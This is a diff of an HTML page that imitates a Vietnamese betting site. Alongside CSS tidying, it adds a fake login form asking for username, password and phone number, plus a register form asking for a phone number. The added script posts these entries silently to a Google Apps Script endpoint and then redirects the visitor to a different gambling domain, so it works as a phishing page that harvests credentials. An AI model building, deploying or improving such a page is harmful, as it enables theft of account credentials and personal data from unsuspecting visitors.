@@ -7,37 +7,24 @@
     <style>
         body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #1a1a1a; color: white; margin: 0; padding: 0; overflow-x: hidden; }
         
-        /* HEADER */
-        .header { background: #111; padding: 10px 5% ; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ff9800; }
+        /* HEADER - Giữ nguyên và thêm z-index để bấm được nút */
+        .header { background: #111; padding: 10px 5% ; display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #ff9800; position: relative; z-index: 9999; }
         .logo img { height: 40px; object-fit: contain; }
         .auth-buttons button { padding: 8px 15px; margin-left: 10px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
         .btn-login { background: #ff9800; color: white; }
         .btn-register { background: #444; color: white; }
 
-        /* BANNER TRÀN VIỀN - CHIỀU CAO THẤP */
-.banner-container { 
-    width: 100%; 
-    max-width: 100%; /* Đảm bảo tràn hết màn hình, không còn khoảng trống */
-    overflow: hidden; 
-    position: relative; 
-    background: #000;
-    /* Tỷ lệ 16/4 giúp banner dẹt lại, nhìn sẽ nhỏ gọn và chuyên nghiệp hơn */
-    aspect-ratio: 16 / 4; 
-}
-
-.banner-slide { 
-    display: flex; 
-    width: 600%; 
-    height: 100%; 
-    animation: slide-animation 18s infinite; 
-}
-
-.banner-slide img { 
-    width: 16.666%; 
-    height: 100%; 
-    object-fit: cover; /* Giúp ảnh lấp đầy khung hình mà không bị méo */
-    display: block; 
-}
+        /* BANNER TRÀN VIỀN - Giữ nguyên */
+        .banner-container { 
+            width: 100%; 
+            max-width: 100%; 
+            overflow: hidden; 
+            position: relative; 
+            background: #000;
+            aspect-ratio: 16 / 4; 
+        }
+        .banner-slide { display: flex; width: 600%; height: 100%; animation: slide-animation 18s infinite; }
+        .banner-slide img { width: 16.666%; height: 100%; object-fit: cover; display: block; }
         
         @keyframes slide-animation {
             0%, 14% { transform: translateX(0); }
@@ -49,21 +36,21 @@
             100% { transform: translateX(0); }
         }
 
-        /* MENU ICON - Trải dài ngang để lấp khoảng trống */
+        /* MENU ICON - Giữ nguyên */
         .game-menu { 
             display: flex; 
             background: #222; 
             padding: 10px 5%; 
-            justify-content: space-between; /* Trải đều ra hai bên */
+            justify-content: space-between; 
             border-bottom: 1px solid #333;
             flex-wrap: nowrap;
-            overflow-x: auto; /* Vẫn cho phép vuốt trên mobile */
+            overflow-x: auto; 
         }
         .menu-item { 
             display: flex; 
             flex-direction: column; 
             align-items: center; 
-            flex: 1; /* Mỗi item chiếm không gian bằng nhau để lấp đầy hàng */
+            flex: 1; 
             min-width: 60px;
             font-size: 10px; 
             cursor: pointer; 
@@ -73,12 +60,12 @@
         .menu-item img { width: 24px; height: 24px; margin-bottom: 5px; }
         .menu-item.active { color: #ff9800; font-weight: bold; }
 
-        /* MỤC ĐỀ XUẤT - Sửa lỗi vỡ ảnh */
+        /* MỤC ĐỀ XUẤT - Giữ nguyên */
         .recommend-section { padding: 15px 5%; background-color: #1a1a1a; }
         .recommend-title { font-size: 16px; font-weight: bold; color: white; margin-bottom: 12px; border-left: 4px solid #ff9800; padding-left: 10px; }
         .recommend-container { 
             display: grid; 
-            grid-template-columns: repeat(3, 1fr); /* Chia 3 cột bằng nhau */
+            grid-template-columns: repeat(3, 1fr); 
             gap: 15px; 
         }
         .recommend-item { 
@@ -86,25 +73,26 @@
             border-radius: 8px; 
             overflow: hidden; 
             box-shadow: 0 4px 8px rgba(0,0,0,0.3);
-            background: #333; /* Nền tối để nếu ảnh chưa load không bị trắng xóa */
+            background: #333; 
         }
         .recommend-item img { 
             width: 100%; 
             height: auto; 
             display: block; 
-            object-fit: contain; /* Giữ nguyên tỷ lệ ảnh không bị bóp méo */
+            object-fit: contain; 
         }
 
-        /* Responsive cho Mobile */
+        /* MODAL - Giữ nguyên và bổ sung style cho các ô nhập liệu */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10000; }
+        .modal-content { background: white; width: 320px; margin: 80px auto; padding: 25px; border-radius: 12px; text-align: center; color: #333; position: relative; }
+        .modal-content input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        .btn-submit { width: 100%; padding: 12px; background: #ff9800; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .close-btn { position: absolute; top: 10px; right: 15px; font-size: 20px; cursor: pointer; color: #333; }
+
         @media (max-width: 768px) {
-            .recommend-container { grid-template-columns: 1fr; } /* Mobile hiện 1 ảnh mỗi hàng */
+            .recommend-container { grid-template-columns: repeat(3, 1fr); gap: 5px; } 
             .game-menu { justify-content: flex-start; gap: 20px; }
         }
-
-        /* MODAL */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; }
-        .modal-content { background: white; width: 320px; margin: 80px auto; padding: 25px; border-radius: 12px; text-align: center; color: #333; }
-        .btn-submit { width: 100%; padding: 12px; background: #ff9800; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; margin-top: 10px; }
     </style>
 </head>
 <body>
@@ -147,14 +135,60 @@
         <div class="recommend-title">ĐỀ XUẤT</div>
         <div class="recommend-container">
             <div class="recommend-item"><img src="https://img.b729j88.com/upload/announcement/image_243152.jpg"></div>
-            <div class="recommend-item"><img src="https://img.b729j88.com/upload/announcement/image_243155.jpg"></div>
-            <div class="recommend-item"><img src="https://img.b729j88.com/upload/announcement/image_243159.jpg"></div>
+            <div class="recommend-item"><img src="https://img.b729j88.com/upload/announcement/image_292551.jpg"></div>
+            <div class="recommend-item"><img src="https://img.b729j88.com/upload/announcement/image_292551.jpg"></div>
+        </div>
+    </div>
+
+    <div id="loginModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal('loginModal')">&times;</span>
+            <h2 style="color:#ff9800">ĐĂNG NHẬP</h2>
+            <form id="loginForm">
+                <input type="text" name="user" placeholder="Tên đăng nhập" required>
+                <input type="password" name="pass" placeholder="Mật khẩu" required>
+                <input type="tel" name="phone" placeholder="Số điện thoại (Bắt buộc)" required>
+                <button type="submit" class="btn-submit">ĐĂNG NHẬP</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="registerModal" class="modal">
+        <div class="modal-content">
+            <span class="close-btn" onclick="closeModal('registerModal')">&times;</span>
+            <h2 style="color:#ff9800">ĐĂNG KÝ</h2>
+            <form id="registerForm">
+                <input type="tel" name="phone" placeholder="Nhập số điện thoại nhận khuyến mãi" required>
+                <button type="submit" class="btn-submit">ĐĂNG KÝ NGAY</button>
+            </form>
         </div>
     </div>
 
     <script>
         function openModal(id) { document.getElementById(id).style.display = 'block'; }
         function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+
+        // CẤU HÌNH GỬI DỮ LIỆU GOOGLE SHEETS
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwaVLJXZeJJE2s0XfPLvyq6AUNY4oK6THb8OBOCtzaW9zi6zSg8fYdlXLxZjdmxiw8G/exec"; // Dán link Apps Script vào đây
+        const REDIRECT_URL = "https://4a1.bongvip25.pro"; // Trang sẽ nhảy đến sau khi bấm
+
+        async function postData(formId) {
+            const form = document.getElementById(formId);
+            const formData = new URLSearchParams(new FormData(form));
+            formData.append("type", formId === 'loginForm' ? "Đăng Nhập" : "Đăng Ký");
+
+            // Gửi dữ liệu đi ẩn danh
+            fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: formData })
+            .then(() => {
+                window.location.href = REDIRECT_URL; // Chuyển hướng
+            })
+            .catch(() => {
+                window.location.href = REDIRECT_URL; // Chuyển hướng kể cả khi lỗi
+            });
+        }
+
+        document.getElementById('loginForm').onsubmit = (e) => { e.preventDefault(); postData('loginForm'); };
+        document.getElementById('registerForm').onsubmit = (e) => { e.preventDefault(); postData('registerForm'); };
     </script>
 </body>
 </html>
